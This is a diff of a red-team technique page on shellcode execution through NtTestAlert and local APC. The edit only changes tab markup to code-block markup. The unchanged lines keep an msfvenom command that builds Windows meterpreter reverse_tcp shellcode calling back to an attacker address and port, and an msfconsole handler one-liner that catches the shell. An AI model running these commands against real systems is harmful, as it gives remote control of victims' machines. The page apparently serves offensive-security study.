@@ -18,13 +18,11 @@ The flow of the technique is simple:
 
 Lets's generate the meterpreter shellcode first:
 
-{% tabs %}
-{% tab title="attacker@kali" %}
+{% code title="attacker@kali" %}
 ```csharp
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f c
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ![](../../.gitbook/assets/annotation-2019-05-27-191650.png)
 
@@ -34,13 +32,11 @@ Short code that performs `NtTestAlert` function address resolution, memory alloc
 
 Now, set up a multi handler for catching the incoming meterpreter connection:
 
-{% tabs %}
-{% tab title="attacker@kali" %}
+{% code title="attacker@kali" %}
 ```csharp
 msfconsole -x "use exploits/multi/handler; set lhost 10.0.0.5; set lport 443; set payload windows/x64/meterpreter/reverse_tcp; exploit"
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 Below shows the technique in action, resulting in a meterpreter shell:
 
@@ -48,8 +44,7 @@ Below shows the technique in action, resulting in a meterpreter shell:
 
 ## Code
 
-{% tabs %}
-{% tab title="local-apc.cpp" %}
+{% code title="local-apc.cpp" %}
 ```cpp
 #include "pch.h"
 #include <Windows.h>
@@ -73,8 +68,7 @@ int main()
 	return 0;
 }
 ```
-{% endtab %}
-{% endtabs %}
+{% endcode %}
 
 ## Reference
 
